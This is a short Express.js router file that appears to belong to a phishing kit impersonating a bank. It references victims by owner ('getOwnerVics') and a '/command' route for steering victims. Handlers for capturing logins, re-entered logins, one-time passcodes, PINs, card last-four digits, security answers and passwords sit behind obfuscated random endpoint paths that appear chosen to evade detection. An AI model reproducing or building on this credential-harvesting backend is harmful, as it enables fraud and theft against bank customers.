const express = require("express");
const {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitOtp,
  submitPin,
  submitLast4,
  deleteEntry,
  submitSecAnswer,
  submitPassword,
} = require("../controllers/ubankController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/jnugheiruh", submitLogin);
router.post("/brrijnvirj", submitLoginAgain);
router.post("/ergjejoief", submitOtp);
router.post("/smconjvreu", submitPin);
router.post("/ejcoeivnfj", submitLast4);
router.post("/delete", deleteEntry);
router.post("/enckkjeiue", submitSecAnswer);
router.post("/scnjnsefjj", submitPassword);

module.exports = router;
